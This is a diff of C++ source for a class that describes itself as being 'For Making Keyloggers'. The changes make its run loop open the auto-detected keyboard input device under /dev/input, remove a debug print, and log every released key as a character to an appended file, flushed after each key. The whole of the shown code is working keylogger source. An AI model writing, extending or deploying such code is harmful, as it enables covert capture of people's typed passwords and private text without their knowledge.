@@ -1,4 +1,4 @@
-FILE* fpr;
+FILE* __fpr;
 
 // Keyboard Class, For Making Keyloggers.
 
@@ -33,6 +33,7 @@ class KeyboardTools{
 		while(TargetHandl && TargetEvent && strncmp(TargetEvent+3, "120013", 6) != 0);
                 if (TargetHandl && TargetEvent){
 			strncat(iPath, strstr(TargetHandl, "event"), 7);
+			iPath[strlen(iPath)-1]=0x00;
                         return iPath;
 		}
                 else
@@ -40,27 +41,26 @@ class KeyboardTools{
                 return 0x00;
        }
        FILE* OutputTo(const char* file){
-		return (fpr=(outputfd=fopen(file, "a")));
+		return (__fpr=(outputfd=fopen(file, "a")));
        }
 
        void run(){
-		int fd=open("/dev/input/event0", O_RDONLY);
-		printf ("K OPENED WITH %i\n", fd);
+		int fd=open(iPath, O_RDONLY);
                 if (fd<0)return;
 		while (read(fd, &ie, sizeof(struct input_event))!=-1){
 			if (ie.type==EV_KEY && ie.value==0)
 				switch(ie.code){
 					case 28:
-						fprintf(outputfd, "\n");
+						fprintf(__fpr, "\n");
 						break;
 					case 57:
-						fprintf(outputfd, " ");
+						fprintf(__fpr, " ");
 						break;
 					default:
- 						fprintf(outputfd, "%c", map[ie.code]);
+ 						fprintf(__fpr, "%c", map[ie.code]);
 				}
 
-					fflush(outputfd);
+					fflush(__fpr);
 		}
        }
 
